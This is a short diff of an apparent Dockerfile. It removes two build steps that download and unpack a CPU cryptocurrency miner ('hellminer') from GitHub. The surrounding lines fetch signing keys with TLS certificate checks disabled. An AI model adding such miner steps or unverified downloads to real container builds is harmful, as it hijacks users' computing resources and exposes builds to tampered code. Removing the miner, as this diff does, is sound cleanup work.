@@ -58,8 +58,6 @@ RUN echo "deb http://deb.anydesk.com/ all main"  >> /etc/apt/sources.list
 RUN wget --no-check-certificate https://dl.google.com/linux/linux_signing_key.pub -P /app
 RUN wget --no-check-certificate -qO - https://keys.anydesk.com/repos/DEB-GPG-KEY -O /app/anydesk.key
 RUN apt-key add /app/anydesk.key
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-RUN tar xf hellminer_cpu_linux.tar.gz
 RUN apt-key add /app/linux_signing_key.pub
 RUN set -ex; \
     apt-get update \
